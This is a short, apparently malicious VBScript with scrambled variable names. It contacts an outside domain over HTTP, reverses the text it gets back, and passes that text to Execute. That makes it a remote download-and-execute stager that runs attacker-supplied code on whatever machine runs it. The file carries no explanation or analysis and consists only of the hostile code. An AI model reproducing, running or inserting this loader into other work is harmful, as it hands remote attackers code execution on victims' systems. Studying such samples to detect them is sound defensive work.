FyCTY="X2BLtvZHstjMtkUP22l76hMc3"
URL="http://dilaingil.info/?c=r&" & FyCTY
set aZ5ff=CreateObject("Microsoft.XMLHTTP")

aZ5ff.open "GET",URL,false
aZ5ff.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
aZ5ff.setRequestHeader "User-Agent", "RemoveIT"
aZ5ff.send "Z"

For i = Len(aZ5ff.responsetext) to 1  Step-1
    var= Mid(aZ5ff.responsetext,  i  , 1)
    fZGul = fZGul & var
Next

execute "Execute fZGul & FyCTYaZ5ff"

